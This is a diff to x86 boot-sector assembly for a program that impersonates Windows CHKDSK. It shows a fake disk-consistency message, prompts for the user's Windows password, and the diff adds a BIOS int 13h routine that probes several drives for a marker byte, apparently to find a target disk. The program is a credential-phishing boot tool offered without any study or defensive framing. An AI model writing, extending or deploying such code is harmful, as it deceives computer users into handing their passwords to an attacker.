@@ -36,14 +36,31 @@ sleep:
   end:
    ret
 
+find_disk:
+ mov dh, 0x00 ; zeroeth head
+ mov ah, 0x02 ; I want to read
+ mov al, 0x01 ; I want to read one sector
+ mov cx, 0x01 ; first sector, zero-eth track
+ mov bx, 0x7E00
+ int 13h
+ jc nope
+  mov al, [0x7E03]
+  cmp al, 0x99
+  jne nope
+   biosprint ya
+   jmp done_find_disk
+ nope:
+  biosprint no
+ done_find_disk:
+  ret
+
 ; Declarations
-blank db 13, 10, 0
 checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
-ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Please enter your Windows password to continue: ', 0
+ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Enter your Windows password to continue: ', 0
 rmchar db 8,' ',8,0
 checking db 13,10,13,10, 'Performing check on volume C:', 13,10,'This may take up to a minute.',0
-error db 'ack!',0
-ok db 'ok!',0
+ya db 'ok!',0
+no db 'no!',0
 
 start:
  mov ax, cs
@@ -73,21 +90,14 @@ readchar:
 done_password:
  biosprint checking
 
-find_disk:
- mov dl, 0x80 ; first hard disk
- mov dh, 0x00 ; zeroeth head
- mov ah, 0x02 ; I want to read
- mov al, 0x01 ; I want to read one sector
- mov cx, 0x01 ; first sector, zero-eth track
- mov bx, 0x7E00
- int 13h
- jc ack_msg  ; if there was no error reading
-  mov bx, 0x7E00
-  mov al, [bx+3]
-  call putc
-  jmp last
- ack_msg:
-  biosprint error
+mov dl, 0x00
+call find_disk
+mov dl, 0x01
+call find_disk
+mov dl, 0x80
+call find_disk
+mov dl, 0x81
+call find_disk
 
 last:
  jmp $
